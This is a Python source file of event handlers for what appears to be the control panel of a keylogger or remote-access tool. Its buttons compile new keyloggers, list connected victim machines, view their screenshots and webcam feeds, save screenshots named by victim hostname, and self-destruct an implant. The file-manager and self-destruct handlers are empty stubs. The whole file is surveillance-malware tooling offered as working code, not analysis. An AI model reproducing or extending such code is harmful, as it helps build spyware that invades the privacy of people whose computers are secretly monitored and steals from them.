import logging
from datetime import datetime
from pathlib import Path

from .base import BaseEventHandler
from server import Server
from settings import app_config
from gui import UIManager
from utils import EventHandlerRegister, AsyncTkinter

logger = logging.getLogger(__name__)


class ButtonHeaderHandler:
    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_MAIN)
    def main_window():
        UIManager.render_window(app_config.gui.config.FILENAME_MAIN_CONFIG)

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_INFO)
    def info_command_window():
        UIManager.render_window(app_config.gui.config.FILENAME_INFO_CONFIG)

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_CREATE)
    def create_keyloggers_window():
        UIManager.render_top_level(app_config.gui.config.FILENAME_COMPILE_CONFIG)
        btn = UIManager.REGISTER.get(app_config.gui.keys.widget_names.BUTTON_CREATE)
        btn.config(state='disabled')

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_SCREEN)
    def screenshot_send_window():
        UIManager.render_window(app_config.gui.config.FILENAME_SCREEN_CONFIG)

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_WEB)
    def web_camera_window():
        UIManager.render_window(app_config.gui.config.FILENAME_WEB_CONFIG)

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_DESTRUCT)
    def destruct_keylogger_window():
        pass

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_FILE)
    def file_manager_window():
        pass


class ButtonUtilsHandler:
    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_REFRESH)
    @AsyncTkinter.async_handler
    async def refresh_keyloggers_table():
        logger.info('Refresh Table')
        server = Server()
        await server.monitor_client()
        keyloggers = set(server.clients.keys())
        table = UIManager.REGISTER.get(app_config.gui.keys.widget_names.TABLE_KEYLOGGERS)
        rows = dict(map(lambda item: (tuple(item.values), item.iid), table.get_rows()))
        all_rows = set(rows.keys())
        rows_delete, rows_insert = all_rows - keyloggers, keyloggers - all_rows
        if rows_delete:
            logger.debug(f'Delete Keyloggers - {rows_delete}')
            BaseEventHandler.change_state_header_buttons('disabled')
            rows_delete = list(map(lambda item: rows[item], rows_delete))
            table.delete_rows(iids=rows_delete)
        if rows_insert:
            logger.debug(f'Insert Keyloggers - {rows_insert}')
            table.insert_rows('end', list(rows_insert))
            table.load_table_data()

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_SAVE_SCREEN)
    def save_screenshot():
        logger.debug("Started screenshot saving process")
        UIManager.REGISTER.get(app_config.gui.keys.widget_names.BUTTON_SAVE_SCREEN).configure(state='disabled')
        label = UIManager.REGISTER.get(app_config.gui.keys.widget_names.LABEL_SCREEN)
        if not hasattr(label, 'image'):
            return
        hostname = Server().selected_keylogger[0]
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screen_name = Path(f'{hostname}_{timestamp}.png')
        save_path = app_config.SCREENSHOT_DIR / screen_name
        label.image.save(save_path)
        label.configure(image='')
        label.image = None
